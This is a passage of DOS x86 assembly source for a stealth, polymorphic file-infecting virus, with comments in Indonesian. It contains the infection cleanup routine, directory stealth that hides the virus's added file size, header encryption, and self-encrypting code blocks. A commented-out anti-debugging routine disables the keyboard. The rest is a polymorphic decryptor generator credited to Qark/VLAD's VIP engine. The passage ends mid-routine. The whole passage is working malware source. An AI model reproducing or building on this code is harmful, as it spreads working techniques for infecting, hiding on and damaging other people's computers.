      ;* kembalikan waktu dan tanggal asli file dari stack
      PDECODE finish
      pop   cx dx
      mov   ax,5701h
      call  Int21                   

      ;* close file
      mov   ah,3Eh
      call  Int21                    
      PENCODE finish

@@restore_fattr:
      ;* kembalikan attribut asli file dari stack
      TRAP
      pop   ax cx dx
      TRAP  call, Int21
      ret                           ; kembali ke trap21
infection_file endp


;***************
;* DIR STEALTH *
;***************
find_fcb proc near
      ;* find first/next with fcb (11h/12h)
      PDECODE stlthfcb
      not   ax
      xchg  al,ah

      push  bx es ax
      mov   ah,2Fh                  
      call  Int21                   ; get @dta

      pop   ax
      call  Int21                   ; run find first/next
      push  ax
      pushf
      or    al,al                   
      jnz   @@ret                   ; gagal!

      cmp   1 ptr es:[bx],0FFh      ; extended fcb?
      jne   @@notextfcb
      add   bx,7                    ; extended fcb!

@@notextfcb:
      mov   al,1 ptr es:[bx+17h]    ; time
      and   ax,00011111b            ; second 0-4 (al)
      cmp   al,00011111b            ; second 0-4
      jne   @@ret                 

      sub   2 ptr es:[bx+1Dh],file_size   ; size dword
      sbb   2 ptr es:[bx+1Fh],0           ; ----,,----

@@ret:
      popf
      pop   ax es bx
      PENCODE stlthfcb
      TRAP  ret
find_fcb endp

find_hdl proc near
      ;* find first/next with handle (4Eh/4Fh)
      PDECODE stlthdl
      not   ax
      xchg  al,ah

      push  bx es ax
      mov   ah,2Fh                      
      call  Int21                   ; get @dta

      pop   ax
      call  Int21                   ; run find first/next
      push  ax
      pushf
      jc    @@ret                   ; gagal!

      mov   al,1 ptr es:[bx+16h]    ; time
      and   ax,00011111b            ; second 0-4 (al)
      cmp   al,00011111b            ; second 0-4
      jne   @@ret                            

      sub   2 ptr es:[bx+1Ah],file_size   ; size dword
      sbb   2 ptr es:[bx+1Ch],0           ; ----,,----

@@ret:
      popf
      pop   ax es bx
      PENCODE stlthdl
      TRAP  ret
find_hdl endp


;****************************************
;* Enkripsi & Dekripsi Header File Asli *
;****************************************
oldhdr  header_exe <00E9h,0CD00h,0020h>      ; born in memory
encode_header proc near
      ;* enkrip data header asli
      PDECODE enchdr
@@1:
      push  ax bx cx di
      TRAP  cmp,si,0CAFEh
      jne   @@3                     ; First run!
      xor   si,si

@@rdm:
      TRAP  in,ax,40h               ; random timer port --> al
      PADE  11
      or    ax,ax
      jz    @@rdm                   ; rndm <> 0
      cmp   ax,0ffffh
      je    @@rdm
      TRAP
      mov   2 ptr cs:[si+_key],ax
      ;---------------------------------------------

@@3:
      mov   cx,size header_exe/2
      TRAP  mov,ax,0CAFEh
_key  = $-2
      lea   di,[oldhdr][si]
      lea   bx,[@@loop1][si]
      cld
      PENCODE enchdr

      PDECODE enchdrA
@@loop1:
      push  cx
      push  bx

@@loop2:
      xor   ax,2 ptr cs:[bx]
      TRAP
      xor   2 ptr cs:[di],ax
      PADE  333
      rol   ax,cl
      inc   bx
      inc   bx
      loop  @@loop2

      scasw
      pop   bx
      pop   cx
      TRAP
      loop  @@loop1

      pop   di cx bx ax
@@2:
      PENCODE enchdrA
      TRAP  ret
encode_header endp


;***********************
;*        MACRO        *
;* Enkripsi & Dekripsi *
;***********************
;* procedure
ifdef is_fun
decode proc near
      TRAP  pop, bp                            
      PADE  4

      pushf                         ; push reg
      push  ax bx cx
                      
      ;-------------------------------------------
      push  bp
      pop   bx                      ; bx = code size (word)

      mov   cx,cs:[bx]              ; get word+byte (+3) = code size (3 byte)
      inc   bx
      inc   bx                      ; inc returnadresse,3
      PADE  1
      mov   al,1 ptr cs:[bx]        ; al XOR-byte = key
      inc   bx                      ; real body code

      push  bx                      ; bx=data for @ret this routine
      pop   bp

      dec bx
      add bx,cx

      ;-----------------------      ; al value

@@loop1:
      xor   cs:[bx],al
      PADE  9
      rol   al,cl
      ;inc   bx
      dec  bx
      loop  @@loop1
      ;-------------------------------------------

      pop   cx bx ax
      popf                          ; pop reg
      push  bp
      ret
d_cx = $-decode
decode endp

encode proc near
      TRAP  pop, bp                 ; pop @ret

      pushf                         ; push reg
      push  ax bx cx

      ;-------------------------------------------
      push  bp
      pop   bx
      mov   cx,cs:[bx]              ; get word length in cx

      ;* 2x (word) data ENCODE
      inc   bx
      inc   bx                      ; @Return +2 (word) after length
      push  bx
      pop   bp                      ; @ret
      ;--------------------------------------------

      PADE  21
      ;* 2 (word) data ENCODE + 1 data DECODE
      mov   ax,1                    ; WORD (data ENCODE)+data DECODE (Len+Val)
      add   ax,cx                   ; ax is byte+2
      sub   bx,ax                   ; bx is Returnadresse-ax (DECODE+1)
                                    ; Len for DECODE

@@getrndm:
      in    al,40h                  ; random timer port --> al
      or    al,al
      jz    @@getrndm               ; rndm <> 0
      cmp   al,0ffh
      je    @@getrndm
      ;---------------------------------------------

      PADE  2
      mov   cx,cs:[bx]              ; Len
      inc   bx
      inc   bx
      mov   cs:[bx],al              ; Val

      add bx,cx

@@loop1:
      ;inc   bx                      ; sorry garbage is equal for decrypt
      PADE  13
      xor   cs:[bx],al              ; new value ENCODE from random
      rol   al,cl
      dec   bx
      loop  @@loop1

      ;---------------------------------------------

      pop   cx bx ax
      popf
      push  bp
      ret
e_cx = $-encode
encode endp


comment ~
ad_d:
      push  ax bx cx dx si di

decrypt:
      mov   di,offset decode   
      mov   cx,d_cx
      jmp   fuck_off
                                    ;to modify decryption key.
ad_e:
      push  ax bx cx dx si di
      mov   di,offset encode   
      mov   cx,e_cx

fuck_off:
      mov   dl,0adh ;initial key.
      mov   si,offset decrypt       ;offset of code to use

dec_loop:
      lodsb                         ;AL=byte from anti-debug
                                    ;routines

      add   dl,al                   ;MODIFY KEY. If code has been
                                    ;modified, the key will be
						;wrong.

      xor   [di],dl                 ;decrypt
      inc   di

      call  anti_debug              ;kill debuggers.
                                    ;this call cant be NOP'd out,
                                    ;as it is part of the Decrypt
                                    ;key.

      cmp   si,offset end_ad        ;if SI has reached end of
      jne   no_fix                  ;anti-debug code, reset it.
      mov   si,offset decrypt

no_fix:
      loop  dec_loop

      pop   di si dx cx bx ax
      ret                           ;JMP past Anti_Debug to
                                    ;the newly decrypted code..

Anti_Debug:
      in    al,20   ;get IRQ status.
      or    al,2    ;Disable IRQ 1 (keyboard)
      out   20,al

      int   3       ;stop the debugger on each loop (you cant
      int   3       ;NOP these out!), note that when the debugger
                    ;stops here, the keyboard will be disabled,
                    ;so the can't do any thing!


      push  ax
      push  ds
      xor   ax,ax
      mov   ds,ax
      xchg  ax,[4]  ;Kill INT 1
      int   3       ;Fuck with their heads
      xchg  ax,[4]  ;restore INT 1
      pop   ds

      mov   ax,offset ad_jmp        ;destination of JMP
      push  ax
      pop   ax
      dec   ax
      dec   ax      ;if this code was traced, AX will no longer
      pop   ax      ;be equal to the JMP destination
      jmp   ax
      pop
      ret
end_ad:


        (BELOW CODE IS ENCRYPTED)
dec_start:
      in    al,20
      and   al,NOT 2
      out   20,al   ;Re-Enable Key board..
~
endif




;************************
;* SEG:OFS Int 21h asli *
;************************
Int21 proc near
      TRAP  pushf
      TRAP
      call  4 ptr cs:[old.org21]
      TRAP  ret
Int21 endp

ifdef is_poly
setup_poly:
;AL=1 if com file.
;Returns CX=size to write plus stuff in stackend
      TRAP
      push  ax bx dx bp si di

      TRAP  xor,si,si
      TRAP
      mov   di,offset eov
      TRAP  mov,cx,virus_size    ; yang polymorphic
      TRAP
      mov   bp,2 ptr cs:[old.minibuf]
      TRAP  call, vip

      TRAP
      pop   di si bp dx bx ax
      TRAP  ret

;* ....I don't have a time to build a polymorphic engine,
;* so..I would thanks to Qark/VLAD for his (I know!) VIP.
;* Modification by Phardera for my self ;)

vip:
;On entry:
;       AL    = 1 if COM file
;       DS:SI = Points to the unencrypted virus
;       ES:DI = Place to store encrypted virus
;       CX    = length of virus
;       BP    = delta offset
;    Assumes CS=DS=ES
;On return:
;       CX    = length of decryptor + encrypted code

        TRAP
        mov     2 ptr saved_bp,bp

        PDECODE bepe
        cld
        mov     2 ptr saved_cx,cx
        mov     2 ptr saved_di,di
        mov     2 ptr saved_si,si
        mov     1 ptr segtype,al
        mov     1 ptr inloop,0               ;Initialise variable

        ;Initialise our randomisation for slow polymorphism.
        call    init_rand

        ;Clear the register table
        call    unmark_all

        ;Clear the displacements
        call    clear_displacement
        PENCODE bepe

rand_routine:
        ;Select a random decryption type.
        TRAP    call, get_rand
        mov     si,offset dec_type
        and     ax,3*2
        add     si,ax
        mov     ax,2 ptr [si]
        TRAP    jmp,ax

Standard:
;Uses 'standard' encryption.
; ----This is a basic layout of the decryptor----
;       mov     pointer,offset virus_start
;       mov     cipher,xorval
;     loop:
;       xor     2 ptr pointer,cipher
;       inc     pointer
;       inc     pointer
;       cmp     pointer,virus_start+virlength
;       jne     loop
;     virus_start:
; -----------------------------------------------

        PDECODE stdrt
        call    startup                 ;Setup pointer and cipher

        mov     1 ptr inloop,1
        mov     2 ptr loopstart,di

        call    encrypt_type

        or      al,0f8h
        mov     ah,al
        mov     al,81h                  ;CMP pointer,xxxx
        stosw

        call    round_up
        add     ax,2 ptr pointer1val
        stosw

        call    handle_jne              ;JNE xx
        call    calc_jne

        mov     1 ptr inloop,0

        ;Calculate the displacement
        call    fix_displacements
        PENCODE stdrt

        call    encrypt_virus

        call    decryptor_size

        TRAP    ret

Stack1:
;Use the stack method for encryption.  This method doesnt work on EXE's
;because SS <> CS.
; ----This is a basic layout of the decryptor----
;       cli
;       mov     sp,offset virus_start
;       mov     cipher,xor_val
;     loop:
;       pop     reg
;       xor     reg,cipher
;       push    reg
;       pop     randomreg
;       cmp     sp,virus_start+virus_length
;       jne     loop
;       mov     sp,0fffeh
;       sti
; -----------------------------------------------
        PDECODE stack_1

        cmp     1 ptr segtype,0
        jne     stack1_ok
        jmp     rand_routine

stack1_ok:
        call    rand_garbage
        call    rand_garbage
        mov     al,0FAh         ;CLI
        stosb
        call    rand_garbage
        mov     al,0bch         ;MOV SP,xxxx
        stosb
        mov     2 ptr displace,di
        mov     ax,2 ptr saved_bp
        stosw

        call    setup_cipher
        
        mov     1 ptr inloop,1
        mov     2 ptr loopstart,di

        call    select_reg
        call    rand_garbage
        push    ax
        or      al,58h                  ;POP reg
        stosb
        call    rand_garbage

        mov     al,33h                  ;XOR reg,reg
        stosb

        pop     ax
        push    ax
        push    cx
        mov     cl,3
        shl     al,cl      ;!!!!!!!!!!!!!!!!! 3
        or      al,1 ptr cipher
        or      al,0c0h
        stosb
        pop     cx

        call    rand_garbage
        
        pop     ax
        or      al,50h          ;PUSH reg
        stosb

        call    rand_garbage
next_pop:
        call    get_rand
        call    check_reg
        jc      next_pop
        and     al,7
        or      al,58h          ;POP reg  (=add sp,2)
        stosb
        
        call    rand_garbage

        mov     ax,0fc81h       ;CMP SP,xxxx
        stosw
        mov     2 ptr displace2,di
        
        call    round_up
        add     ax,2 ptr saved_bp
        stosw

        call    handle_jne
        call    calc_jne

        mov     1 ptr inloop,0

        mov     al,0bch         ;mov sp,0fffeh
        stosb
        mov     ax,0fffeh
        stosw

        call    rand_garbage
        call    rand_garbage

        mov     al,0FBh         ;STI
        stosb

        call    rand_garbage
        call    rand_garbage

        ;Calculate the displacement
        call    fix_displacements

        mov     si,2 ptr saved_si
        mov     cx,2 ptr saved_cx
        inc     cx
        shr     cx,1
        mov     bx,2 ptr xorval
        PENCODE stack_1

enc_stack1:
        lodsw
        xor     ax,bx
        stosw
        loop    enc_stack1

        call    decryptor_size

        TRAP    ret

Call_Enc:
;Uses recursive calls to decrypt the virus.  Needs a big stack or else it will
;crash.
; ----This is a basic layout of the decryptor----
;       mov     pointer,offset virus_start
;       mov     cipher,xorval
;     loop:
;       cmp     pointer,virus_start+virus_length
;       jne     small_dec
;       ret
;     small_dec:
;       xor     2 ptr pointer,cipher
;       inc     pointer
;       inc     pointer
;       call    loop
;       cli
;       add     sp,virus_length-2
;       sti
; -----------------------------------------------

        PDECODE recursif
        call    startup
        
        mov     1 ptr inloop,1

        mov     2 ptr loopback,di
        call    rand_garbage

        mov     al,1 ptr pointer
        or      al,0f8h
        mov     ah,al
        mov     al,81h                  ;CMP pointer,xxxx
        stosw
        
        call    round_up
        add     ax,2 ptr pointer1val
        stosw

        call    handle_jne

        mov     2 ptr loopf,di
        stosb

        call    rand_garbage

        mov     al,0c3h                 ;RET
        stosb
        
        call    rand_garbage

        mov     ax,di                   ;Fix the JNE.
        mov     si,2 ptr loopf
        inc     si
        sub     ax,si
        dec     si
        mov     1 ptr [si],al
        
        call    encrypt_type

        mov     al,0e8h                 ;CALL xxxx
        stosb
        mov     ax,di
        inc     ax
        inc     ax
        sub     ax,2 ptr loopback
        neg     ax
        stosw

        mov     1 ptr inloop,0

        call    rand_garbage
        mov     al,0FAh         ;CLI
        stosb

        call    rand_garbage
        call    rand_garbage

        mov     ax,0c481h       ;ADD SP,????
        stosw
        mov     ax,2 ptr saved_cx
        dec     ax
        dec     ax
        stosw

        call    rand_garbage
        call    rand_garbage
        mov     al,0FBh         ;STI
        stosb
        call    rand_garbage
        call    rand_garbage

        ;Calculate the displacement
        call    fix_displacements
        PENCODE recursif
        
        call    encrypt_virus
        
        call    decryptor_size

        TRAP    ret

Call_Enc2:
;Decrypts the virus from within a call.
; ----This is a basic layout of the decryptor----
;       mov     pointer,offset virus_start
;       mov     cipher,xorval
;       call    decrypt
;       jmp     short virus_start
;     decrypt:
;       xor     pointer,cipher
;       inc     pointer
;       inc     pointer
;       cmp     pointer,virus_start+viruslength
;       jne     decrypt
;       ret
; -----------------------------------------------

        PDECODE callret

        call    startup

        mov     1 ptr inloop,1

        mov     al,0e8h                 ;CALL xxxx
        stosb
        stosw
        mov     2 ptr loopf16,di
        
        call    rand_garbage

        mov     al,0e9h                 ;JMP xxxx
        stosb
        mov     2 ptr displace2,di
        stosw

        call    rand_garbage
        call    rand_garbage

        mov     ax,di
        mov     si,2 ptr loopf16
        sub     ax,si
        mov     2 ptr [si-2],ax

        mov     2 ptr loopstart,di

        call    encrypt_type
        
        or      al,0f8h
        mov     ah,al
        mov     al,81h          ;CMP pointer,xxxx
        stosw

        call    round_up
        add     ax,2 ptr pointer1val
        stosw

        call    handle_jne
        call    calc_jne

        mov     al,0c3h                 ;ret
        stosb

        mov     1 ptr inloop,0

        call    rand_garbage

        mov     ax,di
        mov     si,2 ptr displace2
        sub     ax,si
        dec     ax
        dec     ax
        mov     [si],ax
        mov     2 ptr displace2,0

        call    rand_garbage

        ;Calculate the displacement
        call    fix_displacements
        PENCODE callret
        
        call    encrypt_virus
        
        call    decryptor_size

        TRAP    ret

;All the different encryption types
dec_type        dw      offset stack1
                dw      offset call_enc
                dw      offset call_enc2
                dw      offset standard

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;General routines, used universally
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
Check_Reg:
;Returns a carry if the register in lower 3 bits of al is bad
        PDECODE ce_reg
        push    ax
        push    si
        and     ax,7
        mov     si,offset reg
        add     si,ax
        cmp     1 ptr [si],0
        pop     si
        pop     ax
        PENCODE ce_reg
        je      ok_reg
        stc
        TRAP    ret
ok_reg:
        clc
        TRAP    ret
        ;       ax,cx,dx,bx,sp,bp,si,di
reg     db      00,00,00,00,01,00,00,00

Mark_Reg:
;Mark a register as used, AL=reg
        PDECODE ma_reg
        push    ax
        push    si
        and     ax,7
        mov     si,offset reg
        add     si,ax
        mov     1 ptr [si],1
        pop     si
        pop     ax
        PENCODE ma_reg
        TRAP    ret

UnMark_All:
;Clears the register table, and sets SP
        PDECODE unma_all
        push    ax
        push    di
        push    cx
        mov     di,offset reg
        xor     al,al
        ;mov     al,0
        mov     cx,8
        rep     segcs stosb
        mov     1 ptr cs:[reg+4],1      ;set sp
        pop     cx
        pop     di
        pop     ax
        PENCODE unma_all
        TRAP    ret

Clear_Displacement:
;Clears all the displacement variables
        PDECODE clr_disp
        push    di
        push    ax
        mov     di,offset displace
        xor     ax,ax
        stosw
        stosw
        stosw
        stosw
        stosw
        pop     ax
        pop     di
        PENCODE clr_disp
        TRAP    ret

Select_Pointer:
;Select an r-m as a pointer, you must call this routine before reserving
;any registers.  Updates the variable r_m.
        PDECODE sel_ptr
        push    ax
        push    si
        call    get_rand
        and     ax,7
        mov     1 ptr r_m,al

        call    index_2_pointer
        mov     al,1 ptr [si]
        call    mark_reg
        inc     si
        mov     al,1 ptr [si]
        or      al,al
        ;cmp     al,0
        jz      no_pointer2
        call    mark_reg
no_pointer2:
        pop     si
        pop     ax
        PENCODE sel_ptr
        TRAP    ret

Setup_Pointer:
;Sets up the registers specified in the r-m with random values.  These
;values are put into the variable 'pointval'.
;Moves the instructions into ES:DI.
        PDECODE setup_ptr
        push    ax
        push    si

        call    rand_garbage

        call    index_2_pointer
        mov     al,1 ptr [si]
        mov     1 ptr pointer,al
        or      al,0b8h                 ;MOV REG,xxxx
        stosb
        call    get_rand
        stosw
        mov     2 ptr pointval,ax
        mov     2 ptr pointer1val,ax

        call    rand_garbage

        mov     al,1 ptr [si+1]
        or      al,al
        ;cmp     al,0
        jz      no_setupp2

        or      al,0b8h                 ;MOV REG,xxxx
        stosb

        call    get_rand
        stosw
        add     2 ptr pointval,ax

        call    rand_garbage

no_setupp2:

        pop     si
        pop     ax
        PENCODE setup_ptr
        TRAP    ret

Index_2_Pointer:
;Sets SI to the 'pointers' table of the r_m
        PDECODE idx_ptr
        push    ax
        xor     ax,ax
        mov     al,1 ptr r_m
        shl     ax,1
        mov     si,offset pointers
        add     si,ax
        pop     ax
        PENCODE idx_ptr
        TRAP    ret

pointer         db      0               ;the first register
pointer1val     dw      0               ;the value of the first register
pointval        dw      0
Pointers        db      3,6     ;[bx+si]
                db      3,7     ;[bx+di]
                db      5,6     ;[bp+si]
                db      5,7     ;[bp+di]
                db      6,0     ;[si]
                db      7,0     ;[di]
                db      5,0     ;[bp]
                db      3,0     ;[bx]

Select_Reg:
;Reserves a random register, and passes it out in AL
;AH is destroyed
        call    get_rand
        call    check_reg
        jc      select_reg
        and     al,7
        call    mark_reg
        TRAP    ret

Setup_Reg:
;Puts the value specified in BX, into the register specified in AL.
;-Needs Fixing- to add a possible SUB, and also the garbage generation needs
;to produce the same add/sub opcodes.
        PDECODE setu_reg
        push    ax
        push    bx

        call    rand_garbage

        and     al,7
        push    ax
        or      al,0b8h         ;MOV reg,xxxx
        stosb
        
        call    get_rand

        sub     bx,ax
        stosw

        call    rand_garbage

        pop     ax
        or      al,al
        ;cmp     al,0
        jnz     long_addreg
        mov     al,5            ;ADD AX,xxxx
        stosb
        jmp     short finish_add
long_addreg:
        or      al,0c0h
        mov     ah,al
        mov     al,81h
        stosw                   ;ADD reg,xxxx
finish_add:
        mov     ax,bx
        stosw
        
        call    rand_garbage

        pop     bx
        pop     ax
        PENCODE setu_reg
        TRAP    ret

Seg_Override:
;Puts the correct segment before a memory write.  The memory write must be
;called immediately afterwards.
        PDECODE seg_ovr
        push    ax
        cmp     1 ptr segtype,1
        je      no_segset
        mov     al,2eh          ;CS:
        stosb
no_segset:
        pop     ax
        PENCODE seg_ovr
        TRAP    ret

Fix_Pointer:
;Fixes up the mod/rm field of a pointer instruction.  Before this routine
;is called, the opcode field has already been stosb'd. eg for xor, 31h has
;been put into the current es:[di-1].
;on entry AL=register
;The displacement field (the following 2 bytes) must be fixed up manually.

        PDECODE fix_ptr
        push    ax
        push    bx
        push    cx

        mov     cl,3
        shl     al,cl
        or      al,1 ptr r_m
        or      al,80h
        stosb

        pop     cx
        pop     bx
        pop     ax
        PENCODE fix_ptr
        TRAP    ret

Dec_Inc_Reg:
;Inc/Dec's the reg in AL. AH= 0=inc 1=dec
;No garbage generators are called in this routine, because the flags
;may be important.
        push    ax
        mov     1 ptr dec_inc,ah
        call    get_rand
        test    al,1
        pop     ax
        push    ax
        jnz     do_inc_dec
        or      al,al
        ;cmp     al,0            ;check for ax
        jnz     not_ax_incdec
        mov     ax,0ff05h       ;ADD AX,ffff  = DEC AX
        cmp     1 ptr dec_inc,0
        jne     fdec1
        mov     al,2dh          ;SUB
fdec1:
        stosw
        mov     al,0ffh
        stosb
        pop     ax
        TRAP    ret
not_ax_incdec:
        cmp     1 ptr dec_inc,0
        je      fdec2
        or      al,0c0h
        jmp     short fdec3
fdec2:
        or      al,0e8h
fdec3:
        mov     ah,al
        mov     al,83h          ;ADD reg,ffff = DEC reg
        stosw
        mov     al,0ffh
        stosb
        pop     ax
        TRAP    ret
do_inc_dec:
        or      al,40h          ;INC reg
        cmp     1 ptr dec_inc,0
        je      fdec4
        or      al,8
fdec4:
        stosb
        pop     ax
        TRAP    ret
dec_inc db      0               ;0=inc 1=dec

Round_Up:
;Rounds up the number in saved_cx to the nearest 2 and passes it out in AX.
        PDECODE rond_up
        mov     ax,2 ptr saved_cx
        inc     ax
        shr     ax,1
        shl     ax,1
        mov     2 ptr saved_cx,ax
        PENCODE rond_up
        TRAP    ret

Fix_Displacements:
;Adds the size of the produced decyptors to the data listed in the
;displacement variables. 0 Values signal the end.
;DI=The final length of the 'decryptor'
        PDECODE fix_disp
        push    ax
        push    si
        
        mov     ax,di
        sub     ax,2 ptr saved_di
        push    di
        mov     si,offset displace
disp_loop:
        cmp     2 ptr [si],0
        je      last_displacement
        mov     di,[si]
        add     [di],ax
        inc     si
        inc     si
        jmp     short disp_loop
last_displacement:
        pop     di
        pop     si
        pop     ax
        PENCODE fix_disp
        TRAP    ret

Rand_Garbage:
;Generates 1-4 garbage instructions.
        PDECODE rnd_gar
        push    ax
        call    get_rand
        and     ax,07h
        push    cx
        mov     cx,ax
        inc     cx
start_garbage:
        call    select_garbage
        loop    start_garbage
        pop     cx
        pop     ax
        PENCODE rnd_gar
        TRAP    ret

Select_Garbage:
;Selects a garbage routine to goto
        
        PDECODE sel_gar
        call    get_rand
        and     ax,14
        push    si
        mov     si,offset calls
        add     si,ax
        mov     ax,2 ptr [si]
        pop     si
        PENCODE sel_gar
        TRAP    jmp, ax

calls   dw      offset Make_Inc_Dec
        dw      offset Imm2Reg
        dw      offset Rand_Instr
        dw      offset Mov_Imm
        dw      offset Make_Xchg
        dw      offset Rand_Instr
        dw      offset Mov_Imm
        dw      offset Imm2Reg

Make_Inc_Dec:
;Puts a word INC/DEC in ES:DI
;eg INC  AX
;   DEC  BP

        mov     ax,di
        sub     ax,2 ptr saved_di
        cmp     ax,15
        ja      not_poly_start          ;inc/dec in the first 20 bytes, flags
        TRAP    ret
not_poly_start:
        call    get_rand
        call    check_reg
        jc      make_inc_dec
        and     al,0fh
        or      al,40h
        
        test    al,8
        jnz     calc_dec

        stosb
        TRAP    ret
calc_dec:
        mov     ah,al
        and     al,7
        cmp     al,2
        ja      Make_Inc_Dec
        mov     al,ah
        stosb
        TRAP    ret

Fix_Register:
;AX=random byte, where the expected outcome is ah=opcode al=mod/rm
;Carry is set if bad register.  Word_Byte is updated to show word/byte.
        PDECODE fix_reg
        test    ah,1
        jnz     word_garbage
        mov     1 ptr word_byte,0
        call    check_breg
        jmp     short byte_garbage
word_garbage:
        mov     1 ptr word_byte,1
        call    check_reg
byte_garbage:
        PENCODE fix_reg
        TRAP    ret        
word_byte       db      0       ;1=word, 0 = byte


Imm2Reg:
;Immediate to register.
        call    get_rand
        call    fix_register
        jc      imm2reg
        test    al,7            ;AX/AL arent allowed (causes heuristics)
        jz      imm2ax
        xchg    al,ah
        and     al,3
        cmp     al,2            ;signed byte is bad
        je      imm2reg
        or      al,80h
        or      ah,0c0h
        stosw
        test    al,2            ;signed word
        jnz     ione_stosb
        call    get_rand
        cmp     1 ptr word_byte,1

        jne     ione_stosb
        stosb
ione_stosb:
        call    get_rand
        stosb
        TRAP    ret
imm2ax:
        xchg    ah,al
        and     al,3dh
        or      al,4
        stosw
        test    al,1
        jnz     ione_stosb
        TRAP    ret

Rand_Instr:
;Creates a whole stack of instructions.
;and,or,xor,add,sub,adc,cmp,sbb

        mov     ax,di
        sub     ax,2 ptr saved_di
        cmp     ax,10
        ja      not_poly_start2         ;in the first 20 bytes, flags G
        TRAP    ret
not_poly_start2:
        call    get_rand
        ;Inloop stops xxx xx,2 ptr [xxxx] instructions inside the
        ;loops.  It changes them to '1 ptr' which stops the ffff crash
        ;problem.
        cmp     1 ptr inloop,1
        jne     ok_words
        and     ah,0feh
ok_words:
        call    fix_register
        jc      rand_instr
        push    cx
        mov     cl,3
        rol     al,cl
        pop     cx
        xchg    ah,al
        and     al,039h
        or      al,2            ;set direction flag
        stosb
        mov     al,ah
        and     al,0c0h
        cmp     al,0c0h
        je      zerobytedisp
        cmp     al,0
        je      checkdisp
        cmp     al,80h
        je      twobytedisp
        ;sign extended
        mov     al,ah
        stosb
negative_value:
        call    get_rand
        cmp     al,0ffh
        je      negative_value
        stosb
        ret
twobytedisp:
        mov     al,ah
        stosb
        call    get_rand
        stosw
        TRAP    ret
checkdisp:
        push    ax
        and     ah,7
        cmp     ah,6
        pop     ax
        je      twobytedisp
zerobytedisp:
        mov     al,ah
        stosb
        TRAP    ret

Mov_Imm:
;Puts a MOV immediate instruction.
        call    get_rand
        test    al,8
        jnz     word_mov
        call    check_breg
        jmp     short mov_check
word_mov:
        TRAP    call,check_reg
mov_check:
        jc      mov_imm
        and     al,0fh
        or      al,0b0h
        stosb
        test    al,8
        jnz     mov_word
        TRAP    call,get_rand
        stosb
        TRAP    ret
mov_word:
        call    get_rand
        stosw
        TRAP    ret

Init_Rand:
;Initialises the Get_Rand procedure.
        PDECODE init_rnd
        push    ax
        push    cx
        push    dx
        push    si
        push    ds
        mov     si,1
        mov     ax,0ffffh               ;Get word from ROM BIOS.
        mov     ds,ax
        mov     ax,2 ptr [si]
        pop     ds
        mov     2 ptr randseed,ax
        call    get_rand
        push    ax
        mov     ah,2ah                  ;Get Date.
        call    Int21
        pop     ax
        add     ax,cx
        xor     ax,dx
        mov     2 ptr randseed,ax
        call    get_rand
        pop     si
        pop     dx
        pop     cx
        pop     ax
        PENCODE init_rnd
        TRAP    ret

Get_Rand:
;Gets a random number in AX.
        PDECODE get_rnd
        push    cx
        push    dx
        mov     ax,2 ptr randseed
        mov     cx,ax
        mov     dx,ax
        and     cx,1ffh
        or      cl,01fh
propogate:
        add     dx,ax
        mul     dx
        add     ax,4321h
        neg     ax
        ror     dx,1
        loop    propogate
        mov     2 ptr randseed,ax
        
        pop     dx
        pop     cx
        PENCODE get_rnd
        TRAP    ret
randseed        dw      0

Make_Xchg:
        mov     ax,di
        sub     ax,2 ptr saved_di
        cmp     ax,10
        ja      not_poly_start3         ;inc/dec in the first 20 bytes, flags
        TRAP    ret
not_poly_start3:

        TRAP    call,get_rand
        TRAP    call,fix_register
        jc      make_xchg
        push    cx
        mov     cl,3
        rol     al,cl
        pop     cx
        TRAP    call,fix_register
        jc      make_xchg
        test    ah,1
        jz      xchg_8bit
        test    al,7
        jz      xchg_ax2
        test    al,38h
        jz      xchg_ax1
xchg_8bit:
        and     ax,13fh
        or      ax,86c0h
        xchg    ah,al
        stosw
        TRAP    ret
xchg_ax1:
        and     al,7
        or      al,90h
        stosb
        TRAP    ret
xchg_ax2:
        push    cx
        mov     cl,3
        ror     al,cl
        pop     cx
        TRAP    jmp,xchg_ax1

Check_bReg:
;Checks if an 8bit reg is used or not.
;AL=register
        PDECODE cek_breg
        push    ax
        and     al,3
        call    check_reg
        pop     ax
        PENCODE cek_breg
        TRAP    ret

Decryptor_Size:
;Calculate the size of the decryptor + code
;Entry: DI=everything done
;Exit : CX=total decryptor length

        PDECODE dec_size
        mov     cx,di
        sub     cx,2 ptr saved_di
        PENCODE dec_size
        TRAP    ret

Setup_Cipher:
;Randomly selects a cipher register and initialises it with a value.
;Puts the register into the variable 'cipher' and the value into 'xorval'

        PDECODE set_cip
        call    rand_garbage
        call    get_rand
        mov     bx,ax
        mov     2 ptr xorval,ax
        call    select_reg
        mov     1 ptr cipher,al
        call    setup_reg
        call    rand_garbage
        PENCODE set_cip
        TRAP    ret

Startup:
;Does the most common startup procedures.  Puts some garbage, and sets
;up the pointer register.

        PDECODE start_up
        call    rand_garbage
        call    rand_garbage
        call    select_pointer          ;Setup pointer
        call    setup_pointer

        call    setup_cipher
        PENCODE start_up
        TRAP    ret

Handle_JNE:
;Randomly puts either JNE or JB at ES:DI.
;Must be called after the CMP instruction.
        PDECODE hdl_jne
        push    ax
        push    si

        ;Test to make sure our pointer isnt going +ffff, if so, only use
        ;jne, not jnb.
        call    round_up
        add     ax,2 ptr pointer1val
        jnc     random_jne
        mov     al,75h
        jmp     short unrandom_jne
random_jne:

        call    get_rand
        and     ax,1
        mov     si,offset jne_table
        add     si,ax
        mov     al,1 ptr [si]
unrandom_jne:
        stosb
        pop     si
        pop     ax
        PENCODE hdl_jne
        TRAP    ret

jne_table       db      75h     ;JNE/JNZ
                db      72h     ;JB/JNAE

Calc_JNE:
;Calculates the distance needed to JMP backwards and puts it into ES:DI.
;On entry DI points to the byte after a JNE/JB instruction
;         and 'loopstart' contains the offset of the loop.

        PDECODE calcJNE
        push    ax
        mov     ax,di
        inc     ax
        sub     ax,2 ptr loopstart
        neg     al
        stosb
        call    rand_garbage
        pop     ax
        PENCODE calcJNE
        TRAP    ret

Increase_Pointer:
;Increases the register specified in 'pointer' by two.
;On exit AL=pointer register.
        PDECODE inc_ptr
        call    rand_garbage
        xor     ax,ax
        mov     al,1 ptr pointer
        call    dec_inc_reg
        call    rand_garbage
        call    dec_inc_reg
        call    rand_garbage
        PENCODE inc_ptr
        TRAP    ret

Encrypt_Type:
;Selects the type of encryption and sets everything up.
        PDECODE enc_type
        call    rand_garbage
        call    seg_override

        call    rand3
        mov     al,1 ptr [si+1]
        mov     1 ptr encbyte,al

        mov     al,1 ptr [si]        ;The instruction from 'enc_table'
        stosb

